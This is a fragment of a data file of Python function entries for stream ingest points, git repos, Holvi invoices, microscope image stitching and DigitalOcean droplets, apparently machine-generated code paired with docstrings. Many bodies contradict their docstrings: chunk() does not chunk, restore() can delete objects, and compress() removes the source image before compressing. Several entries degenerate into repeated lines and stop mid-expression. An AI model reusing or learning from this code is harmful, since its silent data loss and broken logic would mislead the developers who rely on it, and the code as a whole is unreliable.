        "def createRtmpIngestPoint(self, privateStreamName, publicStreamName):\n        \"\"\"\n        Creates an RTMP ingest point, which mandates that streams pushed into\n        the EMS have a target stream name which matches one Ingest Point\n        privateStreamName.\n\n        :param privateStreamName: The name that RTMP Target Stream Names must\n            match.\n        :type privateStreamName: str\n\n        :param publicStreamName: The name that is used to access the stream\n            pushed to the privateStreamName. The publicStreamName becomes the\n            streams localStreamName.\n        :type publicStreamName: str\n\n        :link: http://docs.evostream.com/ems_api_definition/createingestpoint\n        \"\"\"\n        params = {'privateStreamName': privateStreamName,\n                  'publicStreamName': publicStreamName}\n        return self.createIngestPoint(params)",
        "def _get_generator_and_filename(self, generator, filename):\n        \"\"\"Instantiate the generator and filename specification\"\"\"\n        if generator is None:\n            generator = self.generators[filename]\n        return generator, filename",
        "def _run_cmd(self, cmd):\n        \"\"\"Helper function to run commands\n\n        Parameters\n        ----------\n        cmd : list\n              Arguments to git command\n        \"\"\"\n        try:\n            self.git.run(cmd)\n        except Exception as e:\n            self.log.error(\"Error running command: %s\", cmd)\n            self.log.exception(e)",
        "def run_command(self, command, *args, **kwargs):\n        \"\"\"\n        Run a generic command within the repo. Assumes that you are\n        in the repo's root directory\n        \"\"\"\n        if not self.repo:\n            raise RuntimeError(\"You must have a repo to run the command\")\n        return self.repo.run_command(command, *args, **kwargs)",
        "def init_repo(self, username, reponame, force=False, backend=None):\n        \"\"\"\n        Initialize a Git repo\n\n        Parameters\n        ----------\n\n        username, reponame : Repo name is tuple (name, reponame)\n        force: force initialization of the repo even if exists\n        backend: backend that must be used for this (e.g. s3)\n        \"\"\"\n        if backend is None:\n            backend = self.backend\n        if not backend.exists(reponame):\n            backend.init(reponame)\n        if not force:\n            if backend.exists(reponame):\n                raise RepoAlreadyInitializedError(reponame)\n        return reponame",
        "def delete_files(self):\n        \"\"\"Delete files from the repo\"\"\"\n        for path in self.files:\n            self.repo.delete(path)",
        "def cleanup(self):\n        \"\"\"Cleanup the repo\"\"\"\n        if self.repo:\n            self.repo.cleanup()\n            self.repo = None",
        "def get_permalink(self):\n        \"\"\"Get the permalink to command that generated the dataset\"\"\"\n        if self.permalink is None:\n            return None\n        return self.permalink.format(**self.get_permalink_kwargs())",
        "def add_files(self, files):\n        \"\"\"Add files to the repo\"\"\"\n        for filename in files:\n            self.add_file(filename)",
        "def send(self, send_email=True):\n        \"\"\"\n        Marks the invoice as sent in Holvi\n\n        If send_email is False then the invoice is *not* automatically emailed to the recipient\n        and your must take care of sending the invoice yourself.\n        \"\"\"\n        if not self.id:\n            raise ValueError(\"Invoice has no id\")\n\n        if send_email:\n            self.email_to = self.recipient\n            self.email_subject = self.subject\n            self.email_body = self.body\n            self.email_html = self.html\n\n        self.status = InvoiceStatus.SENT\n        self.save()",
        "def to_json(self):\n        \"\"\"Convert our Python object to JSON acceptable to Holvi API\"\"\"\n        return {\n            'id': self.id,\n            'name': self.name,\n            'description': self.description,\n            'type': self.type,\n            'created_at': self.created_at,\n            'updated_at': self.updated_at,\n            'status': self.status,\n            'status_description': self.status_description,\n            'status_code': self.status_code,\n            'status_text': self.status_text,\n            'status_code_description': self.status_code_description,\n            'status_code_text': self.status_code_text,\n            'status_code_code': self.status_code_code,\n            'status_code_text': self.",
        "def api_wrapper(self, *args, **kwargs):\n        \"\"\"API wrapper documentation\"\"\"\n        return self.api_request(*args, **kwargs)",
        "def save(self, checkout_uri=None):\n        \"\"\"Saves this order to Holvi, returns a tuple with the order itself and checkout_uri\"\"\"\n        if checkout_uri is None:\n            checkout_uri = self.checkout_uri\n        return self.order, checkout_uri",
        "def untokenize(tokens):\n    \"\"\"Return source code based on tokens.\n\n    This is like tokenize.untokenize(), but it preserves spacing between\n    tokens. So if the original soure code had multiple spaces between\n    some tokens or if escaped newlines were used, those things will be\n    reflected by untokenize().\n    \"\"\"\n    lines = []\n    for token in tokens:\n        if isinstance(token, (str, unicode)):\n            line = token.strip()\n            if line:\n                lines.append(line)\n        elif isinstance(token, (int, float, bool)):\n            line = str(token)\n            if line:\n                lines.append(line)\n    return '\\n'.join(lines)",
        "def load_profile_ini(self):\n        \"\"\"Load profile INI\"\"\"\n        profile_ini = self.profile_ini\n        if profile_ini is None:\n            return\n        if os.path.exists(profile_ini):\n            with open(profile_ini, 'r') as f:\n                profile_ini = f.read()\n        self.profile_ini = profile_ini",
        "def update_profile(self, profile):\n        \"\"\"Update the profile\"\"\"\n        self.profile = profile\n        self.profile_id = profile.get('id')\n        self.profile_name = profile.get('name')\n        self.profile_description = profile.get('description')\n        self.profile_image_url = profile.get('image_url')\n        self.profile_image_width = profile.get('image_width')\n        self.profile_image_height = profile.get('image_height')\n        self.profile_image_url_large = profile.get('image_url_large')\n        self.profile_image_url_small = profile.get('image_url_small')\n        self.profile_image_url_medium = profile.get('image_url_medium')\n        self.profile_image_url_large_medium",
        "def hook(self, hook_name, hook_path, hook_type, hook_args):\n        \"\"\"Insert hook into the repo\"\"\"\n        hook_path = os.path.expanduser(hook_path)\n        hook_type = hook_type.lower()\n        if hook_type not in self.hooks:\n            self.hooks[hook_type] = []\n        self.hooks[hook_type].append(hook_path)",
        "def _try_library(self):\n        \"\"\"Try the library. If it doesnt work, use the command line..\"\"\"\n        if self.library is None:\n            self.library = self.command_line_library()\n        return self.library",
        "def run_command(self, command, **kwargs):\n        \"\"\"Run a shell command\"\"\"\n        if command in self.commands:\n            return self.commands[command](**kwargs)\n        else:\n            raise CommandError(\"Command %s not found\" % command)",
        "def get_commit_history(self, dataset_name):\n        \"\"\"Get the commit history for a given dataset\"\"\"\n        url = self.base_url + '/datasets/{}/commit_history'.format(dataset_name)\n        return self._get(url)",
        "def diff_files(self, files):\n        \"\"\"Look at files and compute the diffs intelligently\"\"\"\n        for filename in files:\n            try:\n                with open(filename, 'r') as f:\n                    lines = f.readlines()\n                    for line in lines:\n                        if line.startswith('#'):\n                            continue\n                        if line.startswith('diff'):\n                            self.diff_file(filename, line)\n            except IOError:\n                pass",
        "def execute_command(self, command, timeout=None):\n        \"\"\"Execute command and wait for it to finish. Proceed with caution because\n        if you run a command that causes a prompt this will hang\"\"\"\n        self.log.debug(\"Executing command: %s\", command)\n        self.log.debug(\"Waiting for command to finish...\")\n        self.log.debug(\"Command: %s\", command)\n        self.log.debug(\"Command timeout: %s\", timeout)\n        self.log.debug(\"Command: %s\", command)\n        self.log.debug(\"Command timeout: %s\", timeout)\n        self.log.debug(\"Command: %s\", command)\n        self.log.debug(\"Command: %s\", command)\n        self.log.debug(\"Command: %s\", command)\n        self.log.debug(\"Command: %s\", command",
        "def sudo(self, user, group, mode):\n        \"\"\"Enter sudo mode\"\"\"\n        self.send_command(b'sudo %s %s %s' % (user, group, mode))",
        "def install_packages(self, package_names, raise_on_error=False):\n        \"\"\"\n        Install specified packages using apt-get. -y options are\n        automatically used. Waits for command to finish.\n\n        Parameters\n        ----------\n        package_names: list-like of str\n        raise_on_error: bool, default False\n            If True then raise ValueError if stderr is not empty\n            debconf often gives tty error\n        \"\"\"\n        cmd = ['apt-get', '-y']\n        cmd.extend(package_names)\n        self.run_command(cmd, raise_on_error=raise_on_error)",
        "def install_packages(self, package_names, raise_on_error=True):\n        \"\"\"\n        Install specified python packages using pip. -U option added\n        Waits for command to finish.\n\n        Parameters\n        ----------\n        package_names: list-like of str\n        raise_on_error: bool, default True\n            If True then raise ValueError if stderr is not empty\n        \"\"\"\n        if not package_names:\n            return\n        cmd = ['pip', 'install']\n        cmd.extend(package_names)\n        self.run_command(cmd, raise_on_error=raise_on_error)",
        "def install_requirements(self, requirements, raise_on_error=True):\n        \"\"\"\n        Install all requirements contained in the given file path\n        Waits for command to finish.\n\n        Parameters\n        ----------\n        requirements: str\n            Path to requirements.txt\n        raise_on_error: bool, default True\n            If True then raise ValueError if stderr is not empty\n        \"\"\"\n        cmd = ['pip', 'install', '-r', requirements]\n        self.run_command(cmd, raise_on_error=raise_on_error)",
        "def create_stitch_macros(path, output_folder=None):\n    \"\"\"Create fiji-macros for stitching all channels and z-stacks for a well.\n\n    Parameters\n    ----------\n    path : string\n        Well path.\n    output_folder : string\n        Folder to store images. If not given well path is used.\n\n    Returns\n    -------\n    output_files, macros : tuple\n        Tuple with filenames and macros for stitched well.\n    \"\"\"\n    output_folder = output_folder or os.path.join(path, 'stitch')\n    output_files = []\n    macros = []\n    for channel in range(3):\n        for zstack in range(3):\n            output_files.append(os.path.join(output_folder,\n                                          'stitch_{}'.format(channel),\n",
        "def compress(images, delete_tif=False, folder=None):\n    \"\"\"\n    Lossless compression. Save images as PNG and TIFF tags to json. Can be\n    reversed with `decompress`. Will run in multiprocessing, where\n    number of workers is decided by ``leicaexperiment.experiment._pools``.\n\n    Parameters\n    ----------\n    images : list of filenames\n        Images to lossless compress.\n    delete_tif : bool\n        Wheter to delete original images.\n    folder : string\n        Where to store images. Basename will be kept.\n\n    Returns\n    -------\n    list of filenames\n        List of compressed files.\n    \"\"\"\n    if folder is None:\n        folder = os.path.join(os.path.dirname(__file__), 'images')\n    if not os.path.exists(folder):\n        os.makedirs",
        "def compress(image, delete_tif=True, force=False):\n    \"\"\"\n    Lossless compression. Save image as PNG and TIFF tags to json. Process\n    can be reversed with `decompress`.\n\n    Parameters\n    ----------\n    image : string\n        TIF-image which should be compressed lossless.\n    delete_tif : bool\n        Wheter to delete original images.\n    force : bool\n        Wheter to compress even if .png already exists.\n\n    Returns\n    -------\n    string\n        Filename of compressed image, or empty string if compress failed.\n    \"\"\"\n    if delete_tif:\n        os.remove(image)\n    if force:\n        return ''\n    return compress_image(image)",
        "def _set_path_and_dirname(self):\n        \"\"\"Set self.path, self.dirname and self.basename.\"\"\"\n        if self.path is None:\n            self.path = os.path.abspath(self.dirname)\n        if self.basename is None:\n            self.basename = os.path.basename(self.path)",
        "def images(self):\n        \"\"\"List of paths to images.\"\"\"\n        if self._images is None:\n            self._images = []\n            for path in self.paths:\n                if path.endswith('.png'):\n                    self._images.append(path)\n        return self._images",
        "def get_image_path(self, well_row, well_column, field_row, field_column):\n        \"\"\"Get path of specified image.\n\n        Parameters\n        ----------\n        well_row : int\n            Starts at 0. Same as --U in files.\n        well_column : int\n            Starts at 0. Same as --V in files.\n        field_row : int\n            Starts at 0. Same as --Y in files.\n        field_column : int\n            Starts at 0. Same as --X in files.\n\n        Returns\n        -------\n        string\n            Path to image or empty string if image is not found.\n        \"\"\"\n        if well_row < 0 or well_row > self.well_rows or well_column < 0 or well_column > self.well_columns:\n            return ''\n        if field_row < 0 or field_",
        "def get_images(self, well_row, well_column):\n        \"\"\"Get list of paths to images in specified well.\n\n\n        Parameters\n        ----------\n        well_row : int\n            Starts at 0. Same as --V in files.\n        well_column : int\n            Starts at 0. Save as --U in files.\n\n        Returns\n        -------\n        list of strings\n            Paths to images or empty list if no images are found.\n        \"\"\"\n        if well_row == 0:\n            return []\n        if well_column == 0:\n            return []\n        return self.get_well_images(well_row, well_column)",
        "def stitch_images(self, folder=None):\n        \"\"\"\n        Stitches all wells in experiment with ImageJ. Stitched images are\n        saved in experiment root.\n\n        Images which already exists are omitted stitching.\n\n        Parameters\n        ----------\n        folder : string\n            Where to store stitched images. Defaults to experiment path.\n\n        Returns\n        -------\n        list\n            Filenames of stitched images. Files which already exists before\n            stitching are also returned.\n        \"\"\"\n        if folder is None:\n            folder = self.folder\n        stitched_images = []\n        for well in self.wells:\n            well.stitch_images(folder)\n            stitched_images.append(well.image_name)\n        return stitched_images",
        "def compress_to_png(self, folder=None, delete_tif=False):\n        \"\"\"\n        Lossless compress all images in experiment to PNG. If folder is\n        omitted, images will not be moved.\n\n        Images which already exists in PNG are omitted.\n\n        Parameters\n        ----------\n        folder : string\n            Where to store PNGs. Defaults to the folder they are in.\n        delete_tif : bool\n            If set to truthy value, ome.tifs will be deleted after compression.\n\n        Returns\n        -------\n        list\n            Filenames of PNG images. Files which already exists before\n            compression are also returned.\n        \"\"\"\n        if folder is None:\n            folder = self.folder\n        png_files = []\n        for image in self.images:\n            if image.name.endswith('.tif'):\n                if delete",
        "def get_field_metadata(self, well_row, well_column, field_row, field_column):\n        \"\"\"Get OME-XML metadata of given field.\n\n        Parameters\n        ----------\n        well_row : int\n            Y well coordinate. Same as --V in files.\n        well_column : int\n            X well coordinate. Same as --U in files.\n        field_row : int\n            Y field coordinate. Same as --Y in files.\n        field_column : int\n            X field coordinate. Same as --X in files.\n\n        Returns\n        -------\n        lxml.objectify.ObjectifiedElement\n            lxml object of OME-XML found in slide/chamber/field/metadata.\n        \"\"\"\n        return self.get_well_metadata(well_row, well_column,\n                                      field_row, field_column)",
        "def get_stitch_coords(self, well_row, well_column):\n        \"\"\"Get a list of stitch coordinates for the given well.\n\n        Parameters\n        ----------\n        well_row : int\n            Y well coordinate. Same as --V in files.\n        well_column : int\n            X well coordinate. Same as --U in files.\n\n        Returns\n        -------\n        (xs, ys, attr) : tuples with float and collections.OrderedDict\n            Tuple of x's, y's and attributes.\n        \"\"\"\n        well_data = self.wells[well_row][well_column]\n        xs = well_data['x']\n        ys = well_data['y']\n        attr = well_data['attr']\n        return xs, ys, attr",
        "def create_droplet(self, name, region, size, image, ssh_keys=None,\n                       backups=False, ipv6=False, private_networking=False,\n                       wait=True, **kwargs):\n        \"\"\"\n        Create a new droplet\n\n        Parameters\n        ----------\n        name: str\n            Name of new droplet\n        region: str\n            slug for region (e.g., sfo1, nyc1)\n        size: str\n            slug for droplet size (e.g., 512mb, 1024mb)\n        image: int or str\n            image id (e.g., 12352) or slug (e.g., 'ubuntu-14-04-x64')\n        ssh_keys: list, optional\n            default SSH keys to be added on creation\n            this is highly recommended for ssh access\n        backups: bool, optional",
        "def get_droplet(self, id):\n        \"\"\"\n        Retrieve a droplet by id\n\n        Parameters\n        ----------\n        id: int\n            droplet id\n\n        Returns\n        -------\n        droplet: DropletActions\n        \"\"\"\n        droplet = self.droplets.get(id)\n        if droplet is None:\n            raise DropletNotFound(id)\n        return droplet",
        "def restore(self, image, wait=True):\n        \"\"\"Restore this droplet with given image id\n\n        A Droplet restoration will rebuild an image using a backup image.\n        The image ID that is passed in must be a backup of the current Droplet\n        instance. The operation will leave any embedded SSH keys intact.\n\n        Parameters\n        ----------\n        image: int or str\n            int for image id and str for image slug\n        wait: bool, default True\n            Whether to block until the pending action is completed\n        \"\"\"\n        params = {'ImageId': image}\n        if wait:\n            return self.client.get_object(self.id, params)\n        return self.client.delete_object(self.id, params)",
        "def rebuild(self, image, wait=True):\n        \"\"\"\n        Rebuild this droplet with given image id\n\n        Parameters\n        ----------\n        image: int or str\n            int for image id and str for image slug\n        wait: bool, default True\n            Whether to block until the pending action is completed\n        \"\"\"\n        params = {'ImageId': image}\n        if wait:\n            return self.action('Rebuild', params)\n        return self.client.get_object(self.url, 'Droplet', id=image)",
        "def change_name(self, name, wait=True):\n        \"\"\"Change the name of this droplet\n\n        Parameters\n        ----------\n        name: str\n            New name for the droplet\n        wait: bool, default True\n            Whether to block until the pending action is completed\n\n        Raises\n        ------\n        APIError if region does not support private networking\n        \"\"\"\n        params = {'name': name}\n        return self.action('change_name', params, wait=wait)",
        "def change_kernel(self, kernel_id, wait=True):\n        \"\"\"\n        Change the kernel of this droplet\n\n        Parameters\n        ----------\n        kernel_id: int\n            Can be retrieved from output of self.kernels()\n        wait: bool, default True\n            Whether to block until the pending action is completed\n\n        Raises\n        ------\n        APIError if region does not support private networking\n        \"\"\"\n        url = self._build_url('kernels/{0}'.format(kernel_id))\n        return self._put(url, wait=wait)",
        "def delete(self, wait=True):\n        \"\"\"Delete this droplet\n\n        Parameters\n        ----------\n        wait: bool, default True\n            Whether to block until the pending action is completed\n        \"\"\"\n        self.client.delete_droplet(self.id, wait=wait)",
        "def wait_for_droplet_actions(self, droplet_id):\n        \"\"\"wait for all actions to complete on a droplet\"\"\"\n        while True:\n            droplet = self.get_droplet(droplet_id)\n            if droplet:\n                return droplet\n            time.sleep(self.action_wait_time)",
        "def open(self, interactive=False):\n        \"\"\"Open SSH connection to droplet\n\n        Parameters\n        ----------\n        interactive: bool, default False\n            If True then SSH client will prompt for password when necessary\n            and also print output to console\n        \"\"\"\n        if interactive:\n            self.ssh = self.client.open_ssh(self.droplet_id)\n        else:\n            self.ssh = self.client.open_ssh(self.droplet_id,\n                                           username=self.username,\n                                           password=self.password)",
        "def _request(self, kind, resource, url_components, **kwargs):\n        \"\"\"Send a request to the REST API\n\n        Parameters\n        ----------\n        kind: str, {get, delete, put, post, head}\n        resource: str\n        url_components: list or tuple to be appended to the request URL\n\n        Notes\n        -----\n        kwargs contain request parameters to be sent as request data\n        \"\"\"\n        if kind == 'get':\n            return self._request_get(resource, url_components, **kwargs)\n        elif kind == 'delete':\n            return self._request_delete(resource, url_components, **kwargs)\n        elif kind == 'put':\n            return self._request_put(resource, url_components, **kwargs)\n        elif kind == 'post':\n            return self._request_post(resource, url_components, **kwargs)",
        "def _format_array(self, value):\n        \"\"\"Properly formats array types\"\"\"\n        if isinstance(value, (list, tuple)):\n            return self._format_list(value)\n        elif isinstance(value, dict):\n            return self._format_dict(value)\n        elif isinstance(value, (bool, int, float, str)):\n            return self._format_bool(value)\n        elif isinstance(value, (list, tuple)):\n            return self._format_list(value)\n        elif isinstance(value, (list, tuple)):\n            return self._format_list(value)\n        elif isinstance(value, (list, tuple)):\n            return self._format_list(value)\n        elif isinstance(value, (list, tuple)):\n            return self._format_list(value)\n        elif isinstance(value, (list,",
        "def _create_request_url(self, resource, **kwargs):\n        \"\"\" create request url for resource \"\"\"\n        url = self.request_url\n        if resource:\n            url = url.format(resource=resource)\n        return url",
        "def _request(self, kind):\n        \"\"\"Send a request for this resource to the API\n\n        Parameters\n        ----------\n        kind: str, {'get', 'delete', 'put', 'post', 'head'}\n        \"\"\"\n        if kind == 'get':\n            return self._get()\n        elif kind == 'post':\n            return self._post()\n        elif kind == 'head':\n            return self._head()",
        "def list(self, **kwargs):\n        \"\"\"Send list request for all members of a collection\"\"\"\n        return self._client.list(self.collection_path, **kwargs)",
        "def get_unit(self, unit_id):\n        \"\"\"Get single unit of collection\"\"\"\n        return self.client.get(self.base_url + '/v1/collections/{}/units/{}'.format(self.id, unit_id))",
        "def transfer_to(self, region):\n        \"\"\"Transfer this image to given region\n\n        Parameters\n        ----------\n        region: str\n            region slug to transfer to (e.g., sfo1, nyc1)\n        \"\"\"\n        if region not in self.regions:\n            raise ValueError('region %s not in %s' % (region, self.regions))\n        self.region = region\n        self.save()",
        "def get_object(self, request, *args, **kwargs):\n        \"\"\"\n        id or slug\n        \"\"\"\n        if not self.object:\n            return None\n        if not self.object.slug:\n            return self.object\n        return self.object.get_object()",
        "def _get_id_or_fingerprint(self, id_or_fingerprint):\n        \"\"\"id or fingerprint\"\"\"\n        if isinstance(id_or_fingerprint, str):\n            return id_or_fingerprint\n        elif isinstance(id_or_fingerprint, int):\n            return self.fingerprints[id_or_fingerprint]",
        "def create_domain(self, name, ip_address):\n        \"\"\"\n        Creates a new domain\n\n        Parameters\n        ----------\n        name: str\n            new domain name\n        ip_address: str\n            IP address for the new domain\n        \"\"\"\n        data = {'name': name, 'ip_address': ip_address}\n        return self.post('domains', data=data)",
        "def get_domain_records(self, name):\n        \"\"\"Get a list of all domain records for the given domain name\n\n        Parameters\n        ----------\n        name: str\n            domain name\n        \"\"\"\n        return [self.get_domain_record(name, record) for record in self.get_domain_records_iter()]",
        "def name(self, id, name):\n        \"\"\"Change the name of this domain record\n\n        Parameters\n        ----------\n        id: int\n            domain record id\n        name: str\n            new name of record\n        \"\"\"\n        return self._create_put_request(\n            resource=DOMAIN_RECORD_RESOURCE,\n            billomat_id=id,\n            command=NAME,\n            send_data=name,\n        )",
        "def get_domain_record(self, domain_id, record_id):\n        \"\"\"Retrieve a single domain record given the id\"\"\"\n        return self.get_record(self.domain_records_path % (domain_id, record_id))",
        "def login(self):\n        \"\"\"Logs the user on to FogBugz.\n\n        Returns None for a successful login.\n        \"\"\"\n        self.client.login(self.username, self.password)\n        return None",
        "def chunk(list_, n):\n    \"\"\"Chop list_ into n chunks. Returns a list.\"\"\"\n    return list(map(lambda x: x[0:n], list_))",
        "def first_droplet(self):\n        \"\"\"return first droplet\"\"\"\n        for droplet in self.droplets:\n            if droplet.name == self.name:\n                return droplet\n        return None",
        "def take_snapshot(name):\n    \"\"\"Take a snapshot of a droplet\n\n    Parameters\n    ----------\n    name: str\n        name for snapshot\n    \"\"\"\n    client = get_client()\n    response = client.take_snapshot(name)\n    return response",
        "def allowed_operations(self):\n        \"\"\"Retrieves the allowed operations for this request.\"\"\"\n        if self._allowed_operations is None:\n            self._allowed_operations = self._get_allowed_operations()\n        return self._allowed_operations",
        "def _check_allowed_operations(self, operations):\n        \"\"\"Assets if the requested operations are allowed in this context.\"\"\"\n        if not self.allow_operations:\n            return\n        if not operations:\n            return\n        if not isinstance(operations, list):\n            raise TypeError(\"operations must be a list\")\n        for operation in operations:\n            if not isinstance(operation, Operation):\n                raise TypeError(\"operation must be an Operation\")\n            if operation.operation not in self.allowed_operations:\n                raise ValueError(\"operation %s is not allowed\" % operation.operation)",
        "def _fill_response(self, data):\n        \"\"\"Fills the response object from the passed data.\"\"\"\n        self.response = data\n        self.response_code = data.get('code')\n        self.response_message = data.get('message')\n        self.response_headers = data.get('headers')\n        self.response_data = data.get('data')\n        self.response_data_raw = data.get('data_raw')\n        self.response_data_raw_raw = data.get('data_raw_raw')\n        self.response_data_raw_raw_raw = data.get('data_raw_raw_raw_raw')\n        self.response_data_raw_raw_raw_raw = data.get('data_raw_raw_raw_raw_raw_raw')\n        self.response_data_raw_raw",
        "def process_get(self, request):\n        \"\"\"Processes a `GET` request.\"\"\"\n        self.object = self.get_object()\n        self.object.object_id = request.GET.get('id')\n        self.object.object_type = request.GET.get('type')\n        self.object.object_type_id = request.GET.get('type_id')\n        self.object.object_type_slug = request.GET.get('type_slug')\n        self.object.object_type_slug_lower = request.GET.get('type_slug_lower')\n        self.object.object_type_slug_upper = request.GET.get('type_slug_upper')\n        self.object.object_type_slug_lower_upper = request.GET.get('type_slug_lower_upper')\n        self.object",
        "def process_post(self, request, *args, **kwargs):\n        \"\"\"Processes a `POST` request.\"\"\"\n        self.object = self.get_object()\n        self.object.save()\n        return Response(status=status.HTTP_201_CREATED)",
        "def process_put(self, request, *args, **kwargs):\n        \"\"\"Processes a `PUT` request.\"\"\"\n        self.object = self.get_object()\n        self.object.update(request.data)\n        self.object.save()\n        return Response(status=status.HTTP_204_NO_CONTENT)",
        "def process_delete(self, request, *args, **kwargs):\n        \"\"\"Processes a `DELETE` request.\"\"\"\n        self.object = self.get_object()\n        self.object.delete()\n        return Response(status=status.HTTP_204_NO_CONTENT)",
        "def process_link(self, request: Request) -> Response:\n        \"\"\"Processes a `LINK` request.\n\n        A `LINK` request is asking to create a relation from the currently\n        represented URI to all of the `Link` request headers.\n        \"\"\"\n        uri = request.path\n        rel = request.headers.get(HEADER_REL)\n        if rel is None:\n            return Response(\n                status=status.HTTP_404_NOT_FOUND,\n                headers={HEADER_REL: 'norel'},\n            )\n        if rel == 'self':\n            return Response(\n                status=status.HTTP_200_OK,\n                headers={HEADER_REL: rel},\n            )\n        if rel == 'self-rel':\n            return Response(\n                status=status.HTTP_200_OK,\n                headers={HEADER_REL: rel},\n",
        "def create_project(self, project_name, project_path, project_type):\n        \"\"\"Creates a base Django project\"\"\"\n        self.create_project_path(project_path)\n        self.create_project_type(project_type)\n        self.create_project_name(project_name)\n        self.create_project_template(project_name)\n        self.create_project_content(project_name)",
        "def _query(query, *args, **kwargs):\n    \"\"\"\n    Helper function that performs an `ilike` query if a string value\n    is passed, otherwise the normal default operation.\n    \"\"\"\n    if isinstance(query, basestring):\n        return _query_string(query, *args, **kwargs)\n    else:\n        return _query_dict(query, *args, **kwargs)",
        "def _parse_qs(qs):\n    \"\"\"Parse the querystring into a normalized form.\"\"\"\n    qs = qs.replace('?', '')\n    qs = qs.replace('&', '')\n    qs = qs.replace('#', '')\n    qs = qs.replace('?', '%')\n    qs = qs.replace('&', '%')\n    qs = qs.replace('#', '%')\n    qs = qs.replace('?', '%')\n    qs = qs.replace('&', '%')\n    qs = qs.replace('#', '%')\n    qs = qs.replace('?', '%')\n    qs = qs.replace('&', '%')\n    qs = qs.replace('#', '%')\n    qs = qs.replace('?', '%')\n    qs = qs.replace('&', '%')\n    qs = qs.replace('#', '%')\n   ",
        "def segments(self):\n        \"\"\"Return objects representing segments.\"\"\"\n        segments = []\n        for segment in self.segments_list:\n            segments.append(segment.segments)\n        return segments",
        "def parse_args(args):\n    \"\"\"we expect foo=bar\"\"\"\n    parser = argparse.ArgumentParser(description='')\n    parser.add_argument('-f', '--file', dest='file', required=True,\n                        help='the file to parse')\n    parser.add_argument('-v', '--verbose', dest='verbose', action='store_true',\n                        help='show more output')\n    args = parser.parse_args(args)\n    return args",
        "def set(self, obj):\n        \"\"\"Set the value of this attribute for the passed object.\"\"\"\n        if self.value is None:\n            return\n        if isinstance(self.value, bool):\n            self.value = bool(self.value)\n        elif isinstance(self.value, int):\n            self.value = int(self.value)\n        elif isinstance(self.value, float):\n            self.value = float(self.value)\n        elif isinstance(self.value, str):\n            self.value = self.value.strip()\n        elif isinstance(self.value, datetime):\n            self.value = self.value.isoformat()\n        elif isinstance(self.value, date):\n            self.value = self.value.isoformat()\n        elif isinstance(self.value, datetime):\n            self.value = self.value.isoformat()\n",
        "def _getRanges(specifiers):\n    \"\"\"\n    Consumes set specifiers as text and forms a generator to retrieve\n    the requested ranges.\n\n    @param[in] specifiers\n        Expected syntax is from the byte-range-specifier ABNF found in the\n        [RFC 2616]; eg. 15-17,151,-16,26-278,15\n\n    @returns\n        Consecutive tuples that describe the requested range; eg. (1, 72) or\n        (1, 1) [read as 1 to 72 or 1 to 1].\n    \"\"\"\n    specifiers = specifiers.split(',')\n    if len(specifiers) < 2:\n        raise ValueError('Invalid byte range specification')\n    start, end = specifiers[0].split('-')\n    start = int(start)\n    end = int(end)\n    if end < start",
        "def paginate(iterable, page=1, page_size=None, order_by=None, order_direction=None):\n    \"\"\"Paginate an iterable during a request.\n\n    Magically splicling an iterable in our supported ORMs allows LIMIT and\n    OFFSET queries. We should probably delegate this to the ORM or something\n    in the future.\n    \"\"\"\n    if page_size is None:\n        page_size = DEFAULT_PAGE_SIZE\n    if order_by is None:\n        order_by = DEFAULT_ORDER_BY\n    if order_direction is None:\n        order_direction = DEFAULT_ORDER_DIRECTION\n    if order_by is None:\n        order_by = DEFAULT_ORDER_BY\n    if order_direction is None:\n        order_direction = DEFAULT_ORDER_DIRECTION\n    if order_by is None:\n        order_by = DEFAULT_ORDER",
        "def index_check(func):\n    \"\"\"Decorate test methods with this if you don't require strict index checking\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        if not args:\n            raise AssertionError(\"Index check requires at least one argument\")\n        if len(args) > 1:\n            raise AssertionError(\"Index check requires at most one argument\")\n        if not kwargs:\n            raise AssertionError(\"Index check requires at least one keyword argument\")\n        return func(*args, **kwargs)\n    return wrapper",
        "def read(self, deserialize=False, format=None):\n        \"\"\"\n        Read and return the request data.\n\n        @param[in] deserialize\n            True to deserialize the resultant text using a determiend format\n            or the passed format.\n\n        @param[in] format\n            A specific format to deserialize in; if provided, no detection is\n            done. If not provided, the content-type header is looked at to\n            determine an appropriate deserializer.\n        \"\"\"\n        if format is None:\n            format = self.get_content_type()\n        if format is None:\n            raise ValueError(\"No content-type header found\")\n        if deserialize:\n            return self._deserialize(format)\n        return self._deserialize(format, True)",
        "def update_config(**kwargs):\n    \"\"\"\n    Updates the active resource configuration to the passed\n    keyword arguments.\n\n    Invoking this method without passing arguments will just return the\n    active resource configuration.\n\n    @returns\n        The previous configuration.\n    \"\"\"\n    config = _get_config()\n    config.update(kwargs)\n    return config",
        "def delegate_to_same_name(method):\n    \"\"\"\n    This decorator wraps descriptor methods with a new method that tries\n    to delegate to a function of the same name defined on the owner instance\n    for convenience for dispatcher clients.\n    \"\"\"\n    @wraps(method)\n    def wrapper(*args, **kwargs):\n        if not hasattr(args[0], '_owner'):\n            raise TypeError(\"Method %s must be called on an instance\" % method.__name__)\n        return method(*args, **kwargs)\n    return wrapper",
        "def _prepare_handler(self, handler):\n        \"\"\"\n        Given a single decorated handler function,\n        prepare, append desired data to self.registry.\n        \"\"\"\n        if not hasattr(handler, 'handler'):\n            raise ValueError('Handler function must have a handler attribute')\n        if not hasattr(handler, 'args'):\n            raise ValueError('Handler function must have a args attribute')\n        if not hasattr(handler, 'kwargs'):\n            raise ValueError('Handler function must have a kwargs attribute')\n        if not hasattr(handler, 'func'):\n            raise ValueError('Handler function must have a func attribute')\n        if not hasattr(handler, 'name'):\n            raise ValueError('Handler function must have a name attribute')\n        if not hasattr(handler, 'func_name'):\n            raise ValueError('Handler function must have a func_name attribute')\n        if not hasattr(handler",
        "def find_method(self, input_):\n        \"\"\"Find the first method this input dispatches to.\"\"\"\n        for method in self.methods:\n            if method.input_ == input_:\n                return method\n        raise ValueError(\"No method found for input %s\" % input_)",
        "def get_methodname(self, node):\n        \"\"\"Given a node, return the string to use in computing the\n        matching visitor methodname. Can also be a generator of strings.\n        \"\"\"\n        if isinstance(node, ast.Name):\n            return node.id\n        elif isinstance(node, ast.Attribute):\n            return node.attr\n        elif isinstance(node, ast.Call):\n            return node.func\n        elif isinstance(node, ast.Name):\n            return node.id\n        elif isinstance(node, ast.Attribute):\n            return node.attr\n        elif isinstance(node, ast.Call):\n            return node.func\n        elif isinstance(node, ast.Name):\n            return node.id\n        elif isinstance(node, ast.Attribute):\n            return node.attr\n        elif isinstance(node, ast.Call):\n            return node.func\n       ",
